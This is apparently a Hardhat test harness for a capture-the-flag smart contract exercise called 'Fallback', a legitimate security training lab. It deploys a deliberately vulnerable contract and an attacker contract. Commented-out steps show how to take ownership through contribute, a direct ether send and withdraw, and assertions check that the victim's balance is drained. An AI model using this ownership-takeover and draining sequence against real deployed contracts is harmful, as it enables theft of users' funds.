const {
    time,
    loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Fallback";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy();

        return { owner, victimContract, attackerWallet };
    }

    describe("exploit", async function () {
        let owner, victimContract, attackerWallet, attackerContract;
        before(async function () {
            ({ owner, victimContract, attackerWallet } = await loadFixture(setup));
        })

        it("conduct your attack here", async function () {
            const AttackerFactory = await ethers.getContractFactory("Solution1");
            attackerContract = await AttackerFactory.connect(attackerWallet).deploy(victimContract.address);

            await attackerContract.connect(attackerWallet).attack({value: ethers.utils.parseEther("0.0001")});


//             await victimContract.connect(attackerWallet).contribute({value:ethers.utils.parseEther("0.00005")});
//             let tx = {
//                 to: victimContract.address,
//                 value: ethers.utils.parseEther("0.00005"),
//                 gasLimit: 50000,
//             };
//             const transaction = await attackerWallet.sendTransaction(tx);
//             victimContract.connect(attackerWallet).withdraw();
        });

        after(async function () {
            expect(await victimContract.owner.call()).to.be.equal(attackerContract.address);
            expect(await ethers.provider.getBalance(victimContract.address)).to.be.equal(0);
            //expect(await ethers.provider.getTransactionCount(attackerWallet.address)).to.lessThan(3, "must exploit in two transactions or less");
        });
    });
});